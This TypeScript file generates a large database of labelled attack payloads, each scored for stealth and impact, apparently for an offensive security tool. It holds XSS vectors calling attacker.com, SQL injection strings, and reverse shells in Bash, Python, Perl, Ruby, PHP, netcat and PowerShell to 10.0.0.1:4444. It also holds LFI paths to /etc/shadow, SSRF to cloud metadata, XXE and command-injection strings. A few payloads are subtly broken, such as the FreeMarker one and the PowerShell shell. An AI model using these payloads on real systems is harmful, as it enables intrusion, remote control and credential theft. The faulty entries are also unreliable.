export type PayloadType = 'xss' | 'sqli' | 'rce' | 'lfi' | 'ssrf' | 'xxe' | 'cmd' | 'ssti' | 'custom';
export type EncodingType = 'none' | 'base64' | 'url' | 'hex' | 'html';

export interface Payload {
  id: string;
  type: PayloadType;
  name: string;
  content: string;
  description: string;
  risk: 'low' | 'medium' | 'high' | 'critical';
  encoding: EncodingType;
  stats: {
    stealth: number;
    complexity: number;
    impact: number;
  };
}

export const generateMassivePayloadDB = (): Payload[] => {
  const payloads: Payload[] = [];
  let idCounter = 100;

  // XSS Payloads
  const xssContexts = ['<script>', '<img>', '<svg>', '<body>', '<input>', '<iframe>', '<math>', '<details>', '<object>', '<embed>'];
  const xssEvents = ['onload', 'onerror', 'onmouseover', 'onclick', 'onfocus', 'onblur', 'onkeyup', 'onkeydown', 'onchange', 'onsubmit'];
  const xssActions = ['alert(1)', 'prompt(1)', 'confirm(1)', 'console.log(1)', 'fetch("http://attacker.com")', 'document.location="http://attacker.com"'];
  
  for (let i = 0; i < 250; i++) {
    const ctx = xssContexts[Math.floor(Math.random() * xssContexts.length)];
    const evt = xssEvents[Math.floor(Math.random() * xssEvents.length)];
    const act = xssActions[Math.floor(Math.random() * xssActions.length)];
    let content = '';
    if (ctx === '<script>') content = `<script>${act}</script>`;
    else if (ctx === '<img>') content = `<img src=x ${evt}=${act}>`;
    else if (ctx === '<svg>') content = `<svg/onload=${act}>`;
    else content = `${ctx.replace('>', ` ${evt}=${act}>`)}`;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'xss',
      name: `XSS Vector ${i+1}`,
      content: content,
      description: `Cross-Site Scripting payload using ${ctx} context and ${evt} event.`,
      risk: Math.random() > 0.5 ? 'high' : 'medium',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 40, complexity: Math.floor(Math.random() * 40) + 30, impact: Math.floor(Math.random() * 30) + 50 }
    });
  }

  // SQLi Payloads
  const sqliTechniques = ['Union Based', 'Error Based', 'Boolean Blind', 'Time Based Blind', 'Stacked Queries'];
  const sqliDatabases = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite'];
  const sqliBypasses = ['/**/', '%00', '%0a', '%0d', '%09', '+', '||'];
  
  for (let i = 0; i < 250; i++) {
    const tech = sqliTechniques[Math.floor(Math.random() * sqliTechniques.length)];
    const db = sqliDatabases[Math.floor(Math.random() * sqliDatabases.length)];
    const bypass = sqliBypasses[Math.floor(Math.random() * sqliBypasses.length)];
    let content = '';
    
    if (tech === 'Union Based') content = `' UNION SELECT 1,2,3${bypass}--`;
    else if (tech === 'Error Based') content = `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`;
    else if (tech === 'Boolean Blind') content = `' AND 1=1${bypass}--`;
    else if (tech === 'Time Based Blind') content = `' AND SLEEP(5)${bypass}--`;
    else content = `'; WAITFOR DELAY '0:0:5'--`;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'sqli',
      name: `SQLi ${tech} (${db})`,
      content: content,
      description: `${tech} SQL Injection payload targeting ${db} databases.`,
      risk: 'critical',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 30) + 60, complexity: Math.floor(Math.random() * 40) + 50, impact: Math.floor(Math.random() * 20) + 80 }
    });
  }

  // RCE Payloads
  const rceLanguages = ['Bash', 'Python', 'Perl', 'Ruby', 'PHP', 'Netcat', 'PowerShell'];
  for (let i = 0; i < 250; i++) {
    const lang = rceLanguages[Math.floor(Math.random() * rceLanguages.length)];
    let content = '';
    if (lang === 'Bash') content = `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`;
    else if (lang === 'Python') content = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
    else if (lang === 'Perl') content = `perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
    else if (lang === 'Ruby') content = `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
    else if (lang === 'PHP') content = `php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`;
    else if (lang === 'Netcat') content = `nc -e /bin/sh 10.0.0.1 4444`;
    else content = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'rce',
      name: `${lang} Reverse Shell`,
      content: content,
      description: `Reverse shell payload written in ${lang}.`,
      risk: 'critical',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 20, complexity: Math.floor(Math.random() * 50) + 30, impact: 100 }
    });
  }
  
  // LFI Payloads
  const lfiFiles = ['/etc/passwd', '/etc/shadow', '/var/log/apache2/access.log', '/proc/self/environ', 'C:/Windows/win.ini', 'C:/boot.ini'];
  const lfiBypasses = ['../', '..%2f', '%2e%2e%2f', '....//', '..\\\\', '%00'];
  for (let i = 0; i < 250; i++) {
    const file = lfiFiles[Math.floor(Math.random() * lfiFiles.length)];
    const bypass = lfiBypasses[Math.floor(Math.random() * lfiBypasses.length)];
    const depth = Math.floor(Math.random() * 10) + 3;
    let content = bypass.repeat(depth) + file;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'lfi',
      name: `LFI ${file.split('/').pop() || file.split('\\\\').pop()}`,
      content: content,
      description: `Local File Inclusion payload attempting to read ${file}.`,
      risk: 'high',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 40, complexity: Math.floor(Math.random() * 30) + 20, impact: Math.floor(Math.random() * 30) + 60 }
    });
  }

  // SSRF Payloads
  const ssrfTargets = ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080', 'http://127.0.0.1:22', 'file:///etc/passwd', 'dict://localhost:11211/stat'];
  const ssrfBypasses = ['http://2130706433', 'http://0x7f000001', 'http://0177.0.0.1', 'http://127.1', 'http://[::1]'];
  for (let i = 0; i < 250; i++) {
    const target = ssrfTargets[Math.floor(Math.random() * ssrfTargets.length)];
    const bypass = ssrfBypasses[Math.floor(Math.random() * ssrfBypasses.length)];
    let content = Math.random() > 0.5 ? target : bypass;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'ssrf',
      name: `SSRF Vector ${i+1}`,
      content: content,
      description: `Server-Side Request Forgery payload targeting internal resources.`,
      risk: 'high',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 50, complexity: Math.floor(Math.random() * 30) + 30, impact: Math.floor(Math.random() * 30) + 60 }
    });
  }

  // XXE Payloads
  for (let i = 0; i < 250; i++) {
    const content = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`;
    payloads.push({
      id: (idCounter++).toString(),
      type: 'xxe',
      name: `XXE Vector ${i+1}`,
      content: content,
      description: `XML External Entity payload for local file disclosure.`,
      risk: 'high',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 40, complexity: Math.floor(Math.random() * 30) + 40, impact: Math.floor(Math.random() * 30) + 60 }
    });
  }

  // CMD Injection Payloads
  const cmdSeparators = [';', '|', '||', '&&', '%0a', '%0d'];
  const cmdCommands = ['id', 'whoami', 'cat /etc/passwd', 'uname -a', 'net user', 'ipconfig'];
  for (let i = 0; i < 250; i++) {
    const sep = cmdSeparators[Math.floor(Math.random() * cmdSeparators.length)];
    const cmd = cmdCommands[Math.floor(Math.random() * cmdCommands.length)];
    const content = `${sep} ${cmd}`;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'cmd',
      name: `CMD Injection ${cmd.split(' ')[0]}`,
      content: content,
      description: `OS Command Injection payload executing '${cmd}'.`,
      risk: 'critical',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 30, complexity: Math.floor(Math.random() * 30) + 20, impact: Math.floor(Math.random() * 20) + 80 }
    });
  }

  // SSTI Payloads
  const sstiEngines = ['Jinja2', 'Twig', 'FreeMarker', 'Velocity', 'Smarty'];
  for (let i = 0; i < 250; i++) {
    const engine = sstiEngines[Math.floor(Math.random() * sstiEngines.length)];
    let content = '';
    if (engine === 'Jinja2') content = `{{7*7}}`;
    else if (engine === 'Twig') content = `{{7*7}}`;
    else if (engine === 'FreeMarker') content = `${7*7}`;
    else if (engine === 'Velocity') content = `#set($x=7*7)\${x}`;
    else content = `{math equation="7*7"}`;
    
    payloads.push({
      id: (idCounter++).toString(),
      type: 'ssti',
      name: `SSTI ${engine}`,
      content: content,
      description: `Server-Side Template Injection payload targeting ${engine}.`,
      risk: 'high',
      encoding: 'none',
      stats: { stealth: Math.floor(Math.random() * 40) + 40, complexity: Math.floor(Math.random() * 30) + 50, impact: Math.floor(Math.random() * 30) + 60 }
    });
  }

  return payloads;
};

export const MASSIVE_PAYLOAD_DB = generateMassivePayloadDB();
